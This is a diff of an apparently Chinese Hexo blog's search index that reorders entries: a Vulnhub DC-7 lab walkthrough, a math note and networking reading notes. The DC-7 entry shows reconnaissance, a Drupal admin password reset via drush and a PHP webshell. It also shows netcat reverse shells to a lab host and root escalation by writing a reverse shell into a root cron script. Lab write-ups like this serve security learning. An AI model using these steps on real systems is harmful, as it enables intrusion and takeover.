@@ -736,128 +736,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub-DC-7渗透学习</title>
-    <url>/2022/08/14/Vulnhub-DC-7/</url>
-    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
-<p>攻击机：Kali-2021.3：192.168.11.132</p>
-<p>靶机：Vulnhub-DC-7：192.168.11.141</p>
-</blockquote>
-<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.1-255</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/1.png" alt></p>
-<p>扫描目标端口</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.141</span><br></pre></td></tr></table></figure>
-<p>同时也知道了这个网站的CMS是<code>Drupal 8</code></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/2.png" alt></p>
-<p>既然知道了CMS，那就去看看有没有什么漏洞可以利用</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal 8</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/3.png" alt></p>
-<p>我尝试了几个，但都没有什么结果</p>
-<p>接着我又用<code>msf</code>尝试一下</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/4.png" alt></p>
-<p>但也是一样的结果，没有什么利用的上的</p>
-<p>那就说明这个靶机不是按照正常套路来的，那就直接访问一下看看，访问之后发现有作者给出的线索</p>
-<blockquote>
-<p>DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)</p>
-<p>虽然这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p>
-<p>你要做的，就是跳出框框思考。</p>
-<p>方式“外”框。 :-)</p>
-</blockquote>
-<p>作者告诉我们思维不要被限制，那就来看看这个网站的特点吧</p>
-<p>在这个页面的footer也就是页脚处发现一个看起来并不正常的东西</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/5.png" alt></p>
-<p>直接复制去必应搜索一下，搜索后发现有个Github账号</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/6.png" alt></p>
-<p>进入后发现他有个项目：<code>staffdb</code></p>
-<p>进入这个项目中，在<code>config.php</code>中发现了一个账户和密码</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/7.png" alt></p>
-<blockquote>
-<p>dc7user / MdR3xOgB7#dW</p>
-</blockquote>
-<p>尝试登录网站后台，但是无论尝试几次，依然是错误的</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/8.png" alt></p>
-<p>难道这个是靶场的账号密码吗，想起刚刚开放了22端口，尝试ssh登录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.11.141</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/9.png" alt></p>
-<p>成功登录</p>
-<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先尝试SUID和有无免密的root权限命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/10.png" alt></p>
-<p>但都没有利用点</p>
-<p>那就随便寻找一下有用的信息吧</p>
-<p>然后在用户<code>dc7user</code>目录中发现<code>backups</code>目录和<code>mbox</code>文件，先进入backups，发现都是<code>gpg</code>文件<em>（靶机里是没有html目录的，为什么会有html目录，后面我会提）</em>，<code>gpg</code>文件是一种加密格式，直接打开的话是一串乱码，而且解密还需要密钥，因此暂时没什么帮助</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/11.png" alt></p>
-<p>那就看一下旁边的<code>mbox</code>文件，打开后发现这似乎是管理员（root）的计划任务，会在一定时间后自动执行<code>/opt/scripts/backups.sh</code>文件，还是以root的权限运行</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/12.png" alt></p>
-<p>那么思路就清楚了，如果我们可以对这个脚本文件有修改的权限，那么就可以写入反弹root权限shell的内容了，就能得到root权限了</p>
-<p>那么就查看一下这个文件的权限吧</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/13.png" alt></p>
-<p>可以看到我们当前用户并不能对其写入内容，但还是看一下这个文件里有什么内容吧</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/14.png" alt></p>
-<p>大部分命令都能够明白，其中有两个命令值得注意:<code>drush</code>和<code>gpg</code>，很明显，这个加密的密钥已经能看到了，就是<code>PickYourOwnPassword</code></p>
-<blockquote>
-<p>然后我回去尝试对其解密，解密成功后将其解压，解压出来后发现就是一个<code>html</code>的文件夹，里面并没什么有用的内容，也许是网站站点的一些源码吧</p>
-</blockquote>
-<p>无果后回来研究这个<code>drush</code>命令，发现这个命令是<code>drupal</code>用来管理数据库的</p>
-<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a></p>
-<p>然后还发现这个命令可以修改密码</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/15.png" alt></p>
-<p>那我们就跟着这个脚本文件来到<code>/var/www/html/</code>目录，然后修改密码，第一次尝试修改root用户的密码，发现并不能修改，那就修改默认用户admin的密码试试</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush upwd admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/16.png" alt></p>
-<p>成功修改admin用户密码，后台尝试登录成功</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/17.png" alt></p>
-<p>然后在网站中寻找信息，发现在<code>Content → Add content → Basic page</code>中似乎可以写码，但并没有php的选项</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/18.png" alt></p>
-<p>然后去网上搜索相关信息“drupal 8 PHP”，在drupal官方中找到了解释：<a href="https://www.drupal.org/node/2088811">PHP Filter module removed from Drupal core</a></p>
-<blockquote>
-<p>PHP Filter模块已从Drupal Core中删除，并移至 <a href="http://drupal.org/project/php">http://drupal.org/project/php</a> 的一个贡献模块</p>
-</blockquote>
-<p>原来是官方出于安全考虑，将PHP Filter模块移除，但可以作为一个模块（module）手动安装</p>
-<p>那就跟着官方给的方法，将PHP模块下载下来</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/19.png" alt></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/20.png" alt></p>
-<p>然后回到网站进行安装：<code>Extend → Install new module</code></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/21.png" alt></p>
-<p>安装完成后点击启用</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/22.png" alt></p>
-<p>按提示成功启用<code>PHP Filter</code>模块后回到刚刚写码的地方，Text format选择<code>PHP code</code>，然后写入一句话即可</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/23.png" alt></p>
-<p>然后复制链接地址，打开蚁剑进行连接</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/24.png" alt></p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/25.png" alt></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后进入虚拟终端反弹shell</p>
-<p>kali：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
-<p>蚁剑虚拟终端：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
-<p>改为交互式shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/26.png" alt></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后就是写入反弹shell代码进入<code>backups.sh</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.11.132 3333&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/14/Vulnhub-DC-7/27.png" alt></p>
-<p>然后在kali中监听</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
-<p>然后就是等待这个计划任务的进行，因为执行这个脚本文件的权限是root权限，那么反弹回来的权限自然也是root权限</p>
-<p>成功连接后就能找到flag</p>
-<p><img src="/2022/08/14/Vulnhub-DC-7/28.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123683318?spm=1001.2014.3001.5502">dc-7 靶机渗透学习</a></p>
-<p><a href="https://blog.csdn.net/weixin_44214107/article/details/101123371">DC：7靶机-Walkthrough</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
-<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">使用 GPG 加密和解密文件 | 《Linux就该这么学》 (linuxprobe.com)</a></p>
-]]></content>
-      <categories>
-        <category>靶场&amp;靶机</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>靶机</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Vulnhub-DC-6渗透学习</title>
     <url>/2022/08/12/Vulnhub-DC-6/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
@@ -978,6 +856,128 @@
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123644264?spm=1001.2014.3001.5502">dc-6 靶机渗透学习</a></p>
 <p><a href="https://www.freebuf.com/articles/system/261271.html">Linux通过第三方应用提权实战总结</a></p>
 <p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224">nmap提权几种方式</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-7渗透学习</title>
+    <url>/2022/08/14/Vulnhub-DC-7/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.11.132</p>
+<p>靶机：Vulnhub-DC-7：192.168.11.141</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.11.1-255</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/1.png" alt></p>
+<p>扫描目标端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.11.141</span><br></pre></td></tr></table></figure>
+<p>同时也知道了这个网站的CMS是<code>Drupal 8</code></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/2.png" alt></p>
+<p>既然知道了CMS，那就去看看有没有什么漏洞可以利用</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal 8</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/3.png" alt></p>
+<p>我尝试了几个，但都没有什么结果</p>
+<p>接着我又用<code>msf</code>尝试一下</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/4.png" alt></p>
+<p>但也是一样的结果，没有什么利用的上的</p>
+<p>那就说明这个靶机不是按照正常套路来的，那就直接访问一下看看，访问之后发现有作者给出的线索</p>
+<blockquote>
+<p>DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)</p>
+<p>虽然这个挑战并不完全是技术性的，但如果您需要诉诸暴力破解或字典攻击，您可能不会成功。</p>
+<p>你要做的，就是跳出框框思考。</p>
+<p>方式“外”框。 :-)</p>
+</blockquote>
+<p>作者告诉我们思维不要被限制，那就来看看这个网站的特点吧</p>
+<p>在这个页面的footer也就是页脚处发现一个看起来并不正常的东西</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/5.png" alt></p>
+<p>直接复制去必应搜索一下，搜索后发现有个Github账号</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/6.png" alt></p>
+<p>进入后发现他有个项目：<code>staffdb</code></p>
+<p>进入这个项目中，在<code>config.php</code>中发现了一个账户和密码</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/7.png" alt></p>
+<blockquote>
+<p>dc7user / MdR3xOgB7#dW</p>
+</blockquote>
+<p>尝试登录网站后台，但是无论尝试几次，依然是错误的</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/8.png" alt></p>
+<p>难道这个是靶场的账号密码吗，想起刚刚开放了22端口，尝试ssh登录</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.11.141</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/9.png" alt></p>
+<p>成功登录</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先尝试SUID和有无免密的root权限命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/10.png" alt></p>
+<p>但都没有利用点</p>
+<p>那就随便寻找一下有用的信息吧</p>
+<p>然后在用户<code>dc7user</code>目录中发现<code>backups</code>目录和<code>mbox</code>文件，先进入backups，发现都是<code>gpg</code>文件<em>（靶机里是没有html目录的，为什么会有html目录，后面我会提）</em>，<code>gpg</code>文件是一种加密格式，直接打开的话是一串乱码，而且解密还需要密钥，因此暂时没什么帮助</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/11.png" alt></p>
+<p>那就看一下旁边的<code>mbox</code>文件，打开后发现这似乎是管理员（root）的计划任务，会在一定时间后自动执行<code>/opt/scripts/backups.sh</code>文件，还是以root的权限运行</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/12.png" alt></p>
+<p>那么思路就清楚了，如果我们可以对这个脚本文件有修改的权限，那么就可以写入反弹root权限shell的内容了，就能得到root权限了</p>
+<p>那么就查看一下这个文件的权限吧</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/13.png" alt></p>
+<p>可以看到我们当前用户并不能对其写入内容，但还是看一下这个文件里有什么内容吧</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/14.png" alt></p>
+<p>大部分命令都能够明白，其中有两个命令值得注意:<code>drush</code>和<code>gpg</code>，很明显，这个加密的密钥已经能看到了，就是<code>PickYourOwnPassword</code></p>
+<blockquote>
+<p>然后我回去尝试对其解密，解密成功后将其解压，解压出来后发现就是一个<code>html</code>的文件夹，里面并没什么有用的内容，也许是网站站点的一些源码吧</p>
+</blockquote>
+<p>无果后回来研究这个<code>drush</code>命令，发现这个命令是<code>drupal</code>用来管理数据库的</p>
+<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令</a></p>
+<p>然后还发现这个命令可以修改密码</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/15.png" alt></p>
+<p>那我们就跟着这个脚本文件来到<code>/var/www/html/</code>目录，然后修改密码，第一次尝试修改root用户的密码，发现并不能修改，那就修改默认用户admin的密码试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush upwd admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/16.png" alt></p>
+<p>成功修改admin用户密码，后台尝试登录成功</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/17.png" alt></p>
+<p>然后在网站中寻找信息，发现在<code>Content → Add content → Basic page</code>中似乎可以写码，但并没有php的选项</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/18.png" alt></p>
+<p>然后去网上搜索相关信息“drupal 8 PHP”，在drupal官方中找到了解释：<a href="https://www.drupal.org/node/2088811">PHP Filter module removed from Drupal core</a></p>
+<blockquote>
+<p>PHP Filter模块已从Drupal Core中删除，并移至 <a href="http://drupal.org/project/php">http://drupal.org/project/php</a> 的一个贡献模块</p>
+</blockquote>
+<p>原来是官方出于安全考虑，将PHP Filter模块移除，但可以作为一个模块（module）手动安装</p>
+<p>那就跟着官方给的方法，将PHP模块下载下来</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/19.png" alt></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/20.png" alt></p>
+<p>然后回到网站进行安装：<code>Extend → Install new module</code></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/21.png" alt></p>
+<p>安装完成后点击启用</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/22.png" alt></p>
+<p>按提示成功启用<code>PHP Filter</code>模块后回到刚刚写码的地方，Text format选择<code>PHP code</code>，然后写入一句话即可</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/23.png" alt></p>
+<p>然后复制链接地址，打开蚁剑进行连接</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/24.png" alt></p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/25.png" alt></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>连接成功后进入虚拟终端反弹shell</p>
+<p>kali：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p>蚁剑虚拟终端：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.11.132 2222</span><br></pre></td></tr></table></figure>
+<p>改为交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/26.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然后就是写入反弹shell代码进入<code>backups.sh</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.11.132 3333&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/14/Vulnhub-DC-7/27.png" alt></p>
+<p>然后在kali中监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+<p>然后就是等待这个计划任务的进行，因为执行这个脚本文件的权限是root权限，那么反弹回来的权限自然也是root权限</p>
+<p>成功连接后就能找到flag</p>
+<p><img src="/2022/08/14/Vulnhub-DC-7/28.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123683318?spm=1001.2014.3001.5502">dc-7 靶机渗透学习</a></p>
+<p><a href="https://blog.csdn.net/weixin_44214107/article/details/101123371">DC：7靶机-Walkthrough</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/60880048">Drupal drush 常用命令 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">使用 GPG 加密和解密文件 | 《Linux就该这么学》 (linuxprobe.com)</a></p>
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
@@ -1498,20 +1498,6 @@
       </tags>
   </entry>
   <entry>
-    <title>求斜渐近线</title>
-    <url>/2022/01/10/math/</url>
-    <content><![CDATA[<script type="math/tex; mode=display">
-如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
-<script type="math/tex; mode=display">
-求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
-      <categories>
-        <category>高数笔记</category>
-      </categories>
-      <tags>
-        <tag>math</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE</title>
     <url>/2022/06/02/XXE/</url>
     <content><![CDATA[<h1 id="一、XML与XXE"><a href="#一、XML与XXE" class="headerlink" title="一、XML与XXE"></a>一、XML与XXE</h1><blockquote>
@@ -1570,6 +1556,20 @@
 </li>
 </ol>
 ]]></content>
+  </entry>
+  <entry>
+    <title>求斜渐近线</title>
+    <url>/2022/01/10/math/</url>
+    <content><![CDATA[<script type="math/tex; mode=display">
+如果\lim\limits_{n \to \infty} [f(x)-kx-b]=0，则y=kx+b是曲线的斜渐近线</script><hr>
+<script type="math/tex; mode=display">
+求法：\lim\limits_{n \to \infty} \cfrac{f(x)}{x} = k，且\lim\limits_{n \to \infty} f(x)-kx=b，斜渐近线为y=kx+b</script>]]></content>
+      <categories>
+        <category>高数笔记</category>
+      </categories>
+      <tags>
+        <tag>math</tag>
+      </tags>
   </entry>
   <entry>
     <title>metasploit</title>
@@ -1733,205 +1733,6 @@
       <tags>
         <tag>web</tag>
         <tag>复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（3）</title>
-    <url>/2022/01/22/read-1-3/</url>
-    <content><![CDATA[<h1 id="0x03-网络核心"><a href="#0x03-网络核心" class="headerlink" title="0x03 网络核心"></a>0x03 网络核心</h1><p>通过网络链路和交换机移动数据有两种方法：<strong>分组交换</strong>（packet switching）和<strong>电路交换</strong>（circuit switching）</p>
-<h2 id="一、分组交换"><a href="#一、分组交换" class="headerlink" title="一、分组交换"></a>一、分组交换</h2><ul>
-<li>为了从源端系统向目的端系统发送一个<strong>报文</strong>（message），源将长报文划分为较小的数据块，称之为<strong>分组</strong>（packet）</li>
-<li>在源和目的地之间，每个分组都通过通信链路和<strong>分组交换机</strong>（packet switch）传送。（交换机主要有两类：<strong>路由器</strong>（router）和<strong>链路层交换机</strong>（link-layer switch））</li>
-</ul>
-<h3 id="3-1-存储转发传输"><a href="#3-1-存储转发传输" class="headerlink" title="3.1 存储转发传输"></a>3.1 存储转发传输</h3><ul>
-<li>多数分组交换机在链路的输入端使用<strong>存储转发传输</strong>（store-and-forward transmission）机制</li>
-<li>存储转发传输是指在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组</li>
-</ul>
-<h3 id="3-2-排队时延和分组丢失"><a href="#3-2-排队时延和分组丢失" class="headerlink" title="3.2 排队时延和分组丢失"></a>3.2 排队时延和分组丢失</h3><ul>
-<li>每台分组交换机有多条链路与之相连，对于每条相连的链路，该分组交换机具有一个<strong>输出缓存</strong>（output buffer），它用于存储路由器准备发往那条链路的分组</li>
-<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，这时就会出现<strong>排队时延</strong>（queuing delay）</li>
-<li>因为缓存空间的大小是有限的，一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。此时，将出现<strong>分组丢失（丢包）</strong>（packet loss），到达的分组或已经排队的分组之一将被丢弃</li>
-</ul>
-<h3 id="3-3-转发表和路由选择协议"><a href="#3-3-转发表和路由选择协议" class="headerlink" title="3.3 转发表和路由选择协议"></a>3.3 转发表和路由选择协议</h3><ul>
-<li>每台路由器具有一个<strong>转发表</strong>（forwarding table），用于将目的地址（或目的地址的一部分）映射称为输出链路</li>
-<li>当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发现适当的出链路。路由器则将分组导向该出链路</li>
-<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
-</ul>
-<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
-<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
-</li>
-<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
-</li>
-<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
-<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
-</li>
-<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
-</li>
-</ul>
-<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
-    <url>/2022/01/11/read-1.1/</url>
-    <content><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p>
-<p>​        不久之前，这些计算设备大多数传统PC、服务器等等，然而现在有越来越多的非传统因特网设备与因特网相连，如智能手机、电视、游戏机、家用电器、手表等。</p>
-<p>用因特网术语来说，这些设备都成为<strong>主机（host）</strong>或者<strong>端系统（end system）</strong></p>
-<span id="more"></span>
-<ul>
-<li>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接到一起</li>
-<li>一台端系统要向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包成为<strong>分组（packet）</strong></li>
-<li>分组交换机：当今最著名的两种类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong></li>
-<li>从发送端系统到接收端系统，一个分组所经历的一系列通信链路和分组交换机成为通过该网络的<strong>路径（path）</strong></li>
-<li>端系统通过<strong>因特网服务提供商（Internet Service Provider，ISP）</strong>接入因特网<ul>
-<li>每个 ISP 自身就是一个由多台分组交换机和多段通信链路组成的网络</li>
-<li>各 ISP 为端系统提供了各种不同类型的网络接入</li>
-<li>ISP 也为内容提供者提供因特网接入服务，将Web站点和视频服务器直接连入因特网</li>
-<li>因特网就是将端系统彼此互联，因此为端系统提供接入服务的 ISP 也必须互联</li>
-</ul>
-</li>
-<li>端系统、分组交换机和其他因特网部件都要运行一系列<strong>协议（protocol）</strong>，这些协议控制因特网中信息的接收和发送</li>
-<li><strong>TCP（Transmission Control Protocol，传输控制协议）</strong>和<strong>IP（Internet protocol，国际协议）</strong>是因特网中两个最为重要的协议<ul>
-<li>IP 协议定义了在路由器和端系统之间发送和接收的分组格式</li>
-<li>因特网的主要协议统称为 <strong>TCP</strong>/<strong>IP</strong> </li>
-</ul>
-</li>
-</ul>
-<h2 id="1-2-服务描述"><a href="#1-2-服务描述" class="headerlink" title="1.2 服务描述"></a>1.2 服务描述</h2><p>​        从为应用程序提供服务的基础设施的角度来描述因特网</p>
-<p>​        因特网应用包括移动智能手机和平板电脑应用程序，其中包括即时讯息、来自云的音乐流、电影和电视流、在线社交网络以及多人游戏，因为这些应用程序涉及多个交换数据端系统，故它们被称为<strong>分布式应用程序（distributed application）</strong></p>
-<p>​        运行在不同端系统上的软件需要互相发送数据，此时我们碰到一个核心问题：运行在一个端系统上的应用程序怎样才能指令因特网向运行在另一个端系统上的软件发送数据呢？</p>
-<p>​        与因特网相连的端系统提供了一个<strong>套接字接口（socket interface）</strong>，该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式</p>
-<p>通俗来讲它就是一套发送程序必须遵循的规则集合，因此因特网能够将数据交付给目的地</p>
-<p>这种规则就像你寄信需要遵循的规则，邮政服务有自己的“邮政服务接口”或一套规则，你必须遵循，这样邮政服务才能将信件成功送达。同理，因特网也有一个发送数据的程序必须遵循的套接字接口，使因特网向接收数据的程序交付数据</p>
